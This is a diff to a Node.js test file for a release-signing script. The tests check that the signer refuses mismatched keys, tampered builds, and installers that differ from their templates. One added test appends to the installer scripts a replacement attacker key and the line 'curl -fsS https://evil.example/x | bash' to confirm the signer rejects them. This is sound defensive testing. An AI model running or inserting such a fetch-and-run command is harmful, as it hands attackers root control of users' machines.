@@ -1,46 +1,21 @@
 // scripts/sign-release.mjs, the only process that ever holds the release private key: it signs a
-// production build only with the key whose public half is release-key.pub, only when every file
-// matches the manifest and the installers carry that key, and it never prints the key.
+// production build only with the key whose public half is release-key.pub, only when the build is what
+// its checkout builds (every file against the manifest, the wasm, the protocol, and the installers
+// byte for byte), and it never prints the key.
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { createHash, createPublicKey, verify } from 'node:crypto';
-import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
+import { createPublicKey, verify } from 'node:crypto';
+import { appendFileSync, readFileSync, writeFileSync } from 'node:fs';
 import { join } from 'node:path';
 import { fileURLToPath } from 'node:url';
-import { runSign, signerRoot, tempDir, throwawayKey } from './release-fixtures.mjs';
+import { fakeBuild, publicKeyOf, runSign, signerRoot, tempDir, throwawayKey } from './release-fixtures.mjs';
 
-const sha = (b) => createHash('sha256').update(b).digest('hex');
-const COMMIT = 'f00d'.padEnd(40, '1');
 const VERSION = '3.4.5';
-
-const pemOf = (raw) => createPublicKey({ key: { kty: 'OKP', crv: 'Ed25519', x: raw }, format: 'jwk' }).export({ format: 'pem', type: 'spki' }).toString().trim();
-
-/** A production build's output as build-node.mjs lays it out, small enough to write by hand. */
-function fakeDist(t, raw, { commit = COMMIT } = {}) {
-  const out = tempDir(t, 'tgn-dist-');
-  const rel = join(out, VERSION);
-  mkdirSync(rel);
-  const files = [];
-  for (const [path, text] of [['node.mjs', 'console.log("node")'], ['rocketsim.wasm', 'wasm']]) {
-    writeFileSync(join(rel, path), text);
-    files.push({ path, sha256: sha(Buffer.from(text)), size: Buffer.byteLength(text) });
-  }
-  const inputs = Buffer.from(JSON.stringify({ version: VERSION, files: ['nodes/node/main.ts'] }));
-  writeFileSync(join(rel, 'inputs.json'), inputs);
-  const manifest = { name: 'turbogol-node', version: VERSION, protocol: 1, wasmSha256: files[1].sha256, nodeMajor: 24, entry: 'node.mjs', createdAt: '2026-10-19T00:00:00Z', ...(commit ? { commit } : {}), inputsSha256: sha(inputs), files };
-  writeFileSync(join(rel, 'manifest.json'), JSON.stringify(manifest, null, 2));
-  writeFileSync(join(out, 'launcher.mjs'), 'console.log("launcher")');
-  const installer = `RELEASE_KEY_B64URL="${raw}"\nRELEASE_KEY_PEM="${pemOf(raw)}"\n`;
-  writeFileSync(join(out, 'install.sh'), installer);
-  writeFileSync(join(out, 'install-desktop.sh'), installer);
-  writeFileSync(join(out, 'install-windows.ps1'), installer.replace(/\n/g, '\r\n'));
-  return { out, rel };
-}
 
 test('signs manifest.json and launcher.mjs with the key of release-key.pub (from --key or the environment)', (t) => {
   const key = throwawayKey();
   const root = signerRoot(t, key.raw, VERSION);
-  const { out, rel } = fakeDist(t, key.raw);
+  const { out, rel } = fakeBuild(t, root, key.raw);
   const keyFile = join(tempDir(t, 'tgn-key-'), 'release.json');
   writeFileSync(keyFile, JSON.stringify({ publicKey: key.raw, privateKey: key.pkcs8 }));
   for (const how of [['--key', keyFile], []]) {
@@ -58,8 +33,9 @@ test('signs manifest.json and launcher.mjs with the key of release-key.pub (from
 test('refuses a key that is not release-key.pub, the committed one included, and never prints it', (t) => {
   const stranger = throwawayKey();
   const key = throwawayKey();
-  const { out } = fakeDist(t, key.raw);
-  let r = runSign(signerRoot(t, key.raw, VERSION), ['--dist', out], { TGN_RELEASE_PRIVATE_KEY: stranger.pkcs8 });
+  const root = signerRoot(t, key.raw, VERSION);
+  const { out } = fakeBuild(t, root, key.raw);
+  let r = runSign(root, ['--dist', out], { TGN_RELEASE_PRIVATE_KEY: stranger.pkcs8 });
   assert.equal(r.status, 1);
   assert.match(r.out, /does not match nodes\/release-key\.pub/);
   assert.ok(!r.out.includes(stranger.pkcs8));
@@ -74,7 +50,7 @@ test('refuses a key that is not release-key.pub, the committed one included, and
   assert.match(runSign(real, ['--dist', out]).out, /no key/);
 });
 
-test('refuses installers without the key, files that do not match the manifest, development builds and another commit', (t) => {
+test('refuses installers that are not the templates with the key, files that do not match the manifest, development builds and another commit', (t) => {
   const key = throwawayKey();
   const root = signerRoot(t, key.raw, VERSION);
   const env = { TGN_RELEASE_PRIVATE_KEY: key.pkcs8 };
@@ -84,24 +60,58 @@ test('refuses installers without the key, files that do not match the manifest, 
     assert.match(r.out, pattern);
   };
 
-  let d = fakeDist(t, key.raw);
+  let d = fakeBuild(t, root, key.raw);
   writeFileSync(join(d.out, 'install.sh'), 'RELEASE_KEY_B64URL="__RELEASE_PUBLIC_KEY_B64URL__"\n');
   refused(d.out, /install\.sh still has a __RELEASE_PUBLIC_KEY_\* placeholder/);
 
-  d = fakeDist(t, throwawayKey().raw);
-  refused(d.out, /install\.sh does not carry nodes\/release-key\.pub/);
+  d = fakeBuild(t, root, throwawayKey().raw);
+  refused(d.out, /install\.sh is not nodes\/install\/install\.sh with nodes\/release-key\.pub filled in/);
 
-  d = fakeDist(t, key.raw);
+  // The committed key is there, raw and PEM, but a later assignment replaces it, and one more line
+  // runs as root: nothing but the template filled with the key passes.
+  const attacker = publicKeyOf(throwawayKey().raw);
+  for (const name of ['install.sh', 'install-windows.ps1']) {
+    d = fakeBuild(t, root, key.raw);
+    appendFileSync(join(d.out, name), `RELEASE_KEY_B64URL="${attacker.raw}"\nRELEASE_KEY_PEM="${attacker.pem}"\ncurl -fsS https://evil.example/x | bash\n`);
+    refused(d.out, new RegExp(`${name.replace('.', '\\.')} is not nodes/install/`));
+  }
+
+  d = fakeBuild(t, root, key.raw);
   writeFileSync(join(d.rel, 'node.mjs'), 'evil()');
   refused(d.out, /node\.mjs does not match manifest\.json/);
 
-  d = fakeDist(t, key.raw);
+  d = fakeBuild(t, root, key.raw);
   writeFileSync(join(d.rel, 'inputs.json'), '{}');
   refused(d.out, /inputs\.json does not match manifest\.json/);
 
-  d = fakeDist(t, key.raw, { commit: null });
+  d = fakeBuild(t, root, key.raw, { commit: null });
   refused(d.out, /not a production build/);
 
-  d = fakeDist(t, key.raw);
+  d = fakeBuild(t, root, key.raw);
   refused(d.out, /not from this run's commit/, { GITHUB_SHA: 'e'.repeat(40) });
+});
+
+test("refuses a build whose wasm or protocol is not this checkout's, even with a consistent manifest", (t) => {
+  const key = throwawayKey();
+  const root = signerRoot(t, key.raw, VERSION);
+  const env = { TGN_RELEASE_PRIVATE_KEY: key.pkcs8 };
+  const wasm = join(root, '..', 'src', 'sim', 'wasm', 'rocketsim.wasm');
+  const protocol = join(root, '..', 'src', 'net', 'protocol.ts');
+
+  // A wasm the checkout does not have, listed with its own hash: the manifest is self-consistent.
+  const real = readFileSync(wasm);
+  writeFileSync(wasm, Buffer.concat([real, Buffer.from([0])]));
+  let d = fakeBuild(t, root, key.raw);
+  writeFileSync(wasm, real);
+  let r = runSign(root, ['--dist', d.out], env);
+  assert.equal(r.status, 1, r.out);
+  assert.match(r.out, /does not carry this checkout's rocketsim\.wasm/);
+
+  const text = readFileSync(protocol, 'utf8');
+  writeFileSync(protocol, text.replace(/PROTOCOL_VERSION = (\d+)/, (_, n) => `PROTOCOL_VERSION = ${Number(n) + 1}`));
+  d = fakeBuild(t, root, key.raw);
+  writeFileSync(protocol, text);
+  r = runSign(root, ['--dist', d.out], env);
+  assert.equal(r.status, 1, r.out);
+  assert.match(r.out, /manifest\.json says protocol \d+, this checkout's src\/net\/protocol\.ts \d+/);
 });
